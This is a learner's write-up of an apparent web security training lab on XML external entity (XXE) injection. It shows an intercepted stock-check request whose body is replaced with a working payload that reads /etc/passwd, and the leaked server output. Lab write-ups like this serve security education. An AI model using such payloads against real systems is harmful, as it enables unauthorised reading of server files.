Exploiting XXE using external entities to retrieve files

**Category**: XXE  
**Difficulty**: Apprentice  

---

## Overview / What I Learned

This lab demonstrates how XML parsers that process external entities without restriction can be abused to read sensitive files on the server. 
The vulnerability lies in accepting user-supplied XML input and allowing the definition of external entities via the `<!DOCTYPE>` declaration.

Key takeaways:
- How to craft and inject an external entity to read server-side files.
- The role of XML declaration and `DOCTYPE` in enabling the attack.
- Understanding how the parser expands entity references like `&xxe;` during processing.

---

## Exploit Steps / Attack Methodology

### 1. Initial Setup
- Visited a product page and clicked on the "Check stock" feature.
- Intercepted the HTTP POST request using Burp Suite.
- Observed that the request body was XML-formatted and included `productId` and `storeId` elements.

### 2. Injecting the XXE Payload
- Replaced the original XML body with the following payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
Forwarded the request to the server.

3. Observing the Response
The server responded with an error message:
Invalid product ID: root:x:0:0:root:/root:/bin/bash
confirming that the contents of /etc/passwd were successfully retrieved.

